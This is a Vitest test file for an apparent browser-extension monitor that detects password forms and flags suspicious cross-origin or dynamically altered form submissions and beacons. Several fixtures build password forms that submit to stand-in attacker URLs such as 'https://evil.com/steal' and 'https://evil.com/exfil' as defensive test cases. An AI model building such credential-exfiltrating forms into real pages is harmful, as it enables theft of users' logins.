// @vitest-environment happy-dom
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  _resetState,
  extractOrigin,
  formHasCredentialFields,
  initJsBehaviorMonitor,
  isCrossOriginUrl,
} from "../extension/src/content/js_behavior_monitor";

type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;

const testFetch = vi.fn().mockResolvedValue(new Response());
const testXhrOpen = vi.fn();
const testXhrSend = vi.fn();
const testBeacon = vi.fn().mockReturnValue(true);

beforeAll(() => {
  window.fetch = testFetch as unknown as typeof window.fetch;
  XMLHttpRequest.prototype.open =
    testXhrOpen as unknown as typeof XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.send =
    testXhrSend as unknown as typeof XMLHttpRequest.prototype.send;
  navigator.sendBeacon = testBeacon as unknown as typeof navigator.sendBeacon;
});

beforeEach(() => {
  testFetch.mockClear();
  testXhrOpen.mockClear();
  testXhrSend.mockClear();
  testBeacon.mockClear();
  _resetState();
  document.body.innerHTML = "";
  for (const base of document.head.querySelectorAll("base")) base.remove();
});

describe("credential-field visibility", () => {
  it.each(["display:none", "visibility:hidden"])(
    "ignores a form whose only password input is inline-hidden (%s)",
    (style) => {
      document.body.innerHTML =
        `<form><input type="password" style="${style}"></form>`;
      const form = document.querySelector("form") as HTMLFormElement;
      expect(formHasCredentialFields(form)).toBe(false);
    }
  );

  it("ignores a form whose only password input is disabled", () => {
    document.body.innerHTML = `<form><input type="password" disabled></form>`;
    const form = document.querySelector("form") as HTMLFormElement;
    expect(formHasCredentialFields(form)).toBe(false);
  });

  it("still detects a visible field alongside a honeypot", () => {
    document.body.innerHTML =
      `<form><input type="password" style="display:none"><input type="password"></form>`;
    const form = document.querySelector("form") as HTMLFormElement;
    expect(formHasCredentialFields(form)).toBe(true);
  });

  it.each(["display:none", "visibility:hidden"])(
    "does not emit a beacon signal for a honeypot-only page (%s)",
    (style) => {
      const postSignal = vi.fn<PostSignalFn>();
      initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
      document.body.innerHTML =
        `<form><input type="password" style="${style}"></form>`;

      navigator.sendBeacon("https://analytics.example.com/track", "data");

      expect(
        postSignal.mock.calls.filter((call) => call[0] === "ns-js-exfil-beacon")
      ).toHaveLength(0);
    }
  );
});

describe("effective base URL resolution", () => {
  it("resolves cross-origin helpers against document.baseURI", () => {
    const base = document.createElement("base");
    base.href = "https://cdn.example/static/";
    document.head.appendChild(base);

    expect(isCrossOriginUrl("api/submit")).toBe(true);
    expect(extractOrigin("api/submit")).toBe("https://cdn.example");
  });

  it("resolves a relative formaction against document.baseURI", () => {
    const postSignal = vi.fn<PostSignalFn>();
    const base = document.createElement("base");
    base.href = "https://evil.com/app/";
    document.head.appendChild(base);
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    const password = document.createElement("input");
    password.type = "password";
    const button = document.createElement("button");
    button.type = "submit";
    button.setAttribute("formaction", "steal");
    form.append(password, button);
    document.body.appendChild(form);

    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        isCrossOrigin: true,
        destinationOrigin: "https://evil.com",
      })
    );
  });
});

describe("submitter action authority", () => {
  it("treats a present-but-empty formaction as a document submit", () => {
    const postSignal = vi.fn<PostSignalFn>();
    const form = document.createElement("form");
    form.setAttribute("action", "https://evil.com/steal");
    const password = document.createElement("input");
    password.type = "password";
    const button = document.createElement("button");
    button.type = "submit";
    button.setAttribute("formaction", "");
    form.append(password, button);
    document.body.appendChild(form);

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("does not flag a static cross-origin submitter override as dynamic", () => {
    const postSignal = vi.fn<PostSignalFn>();
    const form = document.createElement("form");
    form.setAttribute("action", "/safe-endpoint");
    const button = document.createElement("button");
    button.type = "submit";
    button.setAttribute("formaction", "https://payments.example/checkout");
    form.appendChild(button);
    document.body.appendChild(form);

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("flags a dynamically changed submitter override without credentials", () => {
    const postSignal = vi.fn<PostSignalFn>();
    const form = document.createElement("form");
    form.setAttribute("action", "/safe-endpoint");
    const button = document.createElement("button");
    button.type = "submit";
    button.setAttribute("formaction", "/also-safe");
    form.appendChild(button);
    document.body.appendChild(form);

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    button.setAttribute("formaction", "https://evil.com/exfil");
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
        destinationOrigin: "https://evil.com",
      })
    );
  });
});
